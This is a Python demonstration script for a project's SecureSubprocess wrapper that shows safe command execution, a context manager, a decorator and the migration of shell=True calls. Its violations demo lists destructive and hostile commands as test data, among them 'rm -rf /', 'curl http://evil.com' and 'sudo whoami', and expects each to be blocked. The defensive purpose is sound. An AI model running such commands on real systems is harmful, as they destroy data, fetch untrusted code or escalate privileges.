#!/usr/bin/env python3
"""
Security Wrapper Demonstration
Shows how to use SecureSubprocess for safer command execution
"""

import sys
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from steve.utils.secure_subprocess import (
    SecureSubprocess, 
    SubprocessSecurityWrapper,
    safe_system_command,
    safe_audio_command,
    SecurityError,
    add_security_to_existing_call
)

def demo_basic_security():
    """Demonstrate basic secure subprocess usage"""
    print("🔒 Basic Security Demo")
    print("-" * 40)
    
    # Safe command - should work
    try:
        print("✅ Testing safe command (ping)...")
        result = SecureSubprocess.safe_run(['ping', '-c', '1', '127.0.0.1'], timeout=5)
        print(f"   Result: {result.returncode}")
    except Exception as e:
        print(f"   Error: {e}")
    
    # Unsafe command - should be blocked
    try:
        print("⚠️  Testing unsafe command (rm)...")
        result = SecureSubprocess.safe_run(['rm', '-rf', '/tmp/test'], timeout=5)
        print(f"   Result: {result.returncode}")
    except SecurityError as e:
        print(f"   🛡️  Blocked: {e}")
    except Exception as e:
        print(f"   Error: {e}")

def demo_wrapper_context():
    """Demonstrate security wrapper context manager"""
    print("\n🔒 Context Manager Demo")
    print("-" * 40)
    
    # Simulate existing code that uses subprocess
    import subprocess
    
    print("✅ Using security wrapper context...")
    try:
        with SubprocessSecurityWrapper():
            # This would normally use subprocess.run directly
            # But now it's automatically secured
            result = subprocess.run(['ping', '-c', '1', '127.0.0.1'], 
                                  capture_output=True, text=True, timeout=5)
            print(f"   Ping successful: {result.returncode == 0}")
    except Exception as e:
        print(f"   Error: {e}")

@add_security_to_existing_call
def legacy_function_example():
    """Example of securing existing function with decorator"""
    import subprocess
    print("🔧 Legacy function with security decorator...")
    try:
        result = subprocess.run(['ping', '-c', '1', '127.0.0.1'], 
                              capture_output=True, text=True, timeout=5)
        return f"Ping result: {result.returncode}"
    except Exception as e:
        return f"Error: {e}"

def demo_convenience_functions():
    """Demonstrate convenience functions"""
    print("\n🔒 Convenience Functions Demo")
    print("-" * 40)
    
    # System monitoring command
    try:
        print("💻 Testing system command...")
        result = safe_system_command(['ping', '-c', '1', '127.0.0.1'])
        print(f"   System command successful: {result.returncode == 0}")
    except Exception as e:
        print(f"   Error: {e}")

def demo_migration_helper():
    """Demonstrate migration helper"""
    print("\n🔒 Migration Helper Demo")
    print("-" * 40)
    
    # Original unsafe arguments
    original_args = {
        'args': ['ping', '-c', '1', '127.0.0.1'],
        'shell': True,  # Unsafe
        'timeout': None  # No timeout
    }
    
    print("⚠️  Original args:", original_args)
    
    # Migrate to secure version
    secure_args = SecureSubprocess.migrate_unsafe_call(original_args)
    print("✅ Migrated args:", secure_args)

def demo_security_violations():
    """Demonstrate various security violations that get blocked"""
    print("\n🛡️  Security Violations Demo")
    print("-" * 40)
    
    dangerous_commands = [
        ['rm', '-rf', '/'],  # Destructive command
        ['bash', '-c', 'echo hello'],  # Shell injection
        ['curl', 'http://evil.com'],  # Network download
        ['sudo', 'whoami'],  # Privilege escalation
    ]
    
    for cmd in dangerous_commands:
        try:
            print(f"🚫 Testing dangerous command: {cmd[0]}...")
            SecureSubprocess.safe_run(cmd, timeout=1)
            print("   ❌ Should have been blocked!")
        except SecurityError as e:
            print(f"   ✅ Correctly blocked: {e}")
        except Exception as e:
            print(f"   ⚠️  Other error: {e}")

def main():
    """Run all demonstrations"""
    print("🔐 SecureSubprocess Demonstration")
    print("=" * 60)
    
    demo_basic_security()
    demo_wrapper_context()
    
    print("\n🔧 Legacy Function Demo")
    print("-" * 40)
    result = legacy_function_example()
    print(f"   {result}")
    
    demo_convenience_functions()
    demo_migration_helper()
    demo_security_violations()
    
    print("\n" + "=" * 60)
    print("✅ Security demonstration completed!")
    print("\n📋 Migration Recommendations:")
    print("1. Use SecureSubprocess.safe_run() for new code")
    print("2. Use SubprocessSecurityWrapper() for existing code blocks")
    print("3. Use @add_security_to_existing_call decorator for functions")
    print("4. Use convenience functions for common operations")
    print("5. Gradually migrate high-risk subprocess calls")

if __name__ == "__main__":
    main()